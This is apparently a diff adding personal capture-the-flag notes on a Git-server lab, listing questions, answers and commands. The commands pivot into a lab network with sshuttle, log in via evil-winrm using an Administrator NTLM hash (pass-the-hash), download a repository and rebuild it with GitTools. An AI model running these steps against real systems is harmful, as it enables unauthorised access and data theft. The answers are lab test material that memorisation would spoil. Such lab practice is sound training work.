@@ -1,0 +1,33 @@
+
+									Personal PC The Wonders of Git 
+								--------------------------------------------
+
+1. Use your WinRM access to look around the Git Server. What is the absolute path to the Website.git directory?
+ans: C:\GitStack\repositories\website.git
+command: sshuttle -r root@10.200.99.200 --ssh-cmd "ssh -i id_rsa" 10.200.99.0/24 -x 10.200.99.200
+command: evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.99.150 
+command: cd ../../..
+command: cd C:\GitStack\repositories\
+command: ls
+
+2. Be warned -- this will take a while, but should complete after a minute or two!
+ans: auto-complete 
+command: download website.git
+command: ctrl+z
+
+3. Rename this subdirectory to .git.
+ans: auto-complete
+command: mv C:\\GitStack\\repositories\\Website.git .git 
+
+4. Recreate the repository -- we will perform some code analysis in the next task!
+ans: auto-complete
+command: git clone https://github.com/internetwache/GitTools
+command: cd GitTools
+command: cd extractor
+command: ./extractor.sh ../../../Website.git ../../../website 
+command: cd ../../../website
+command: separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n";
+	 done; printf "\n\n$separator\n\n\n"
+
+5. The short version is: the most up to date version of the site stored in the Git repository is in the NUMBER-345ac8b236064b431fa43f53d91c98c4834ef8f3 directory. 
+ans: auto-complete
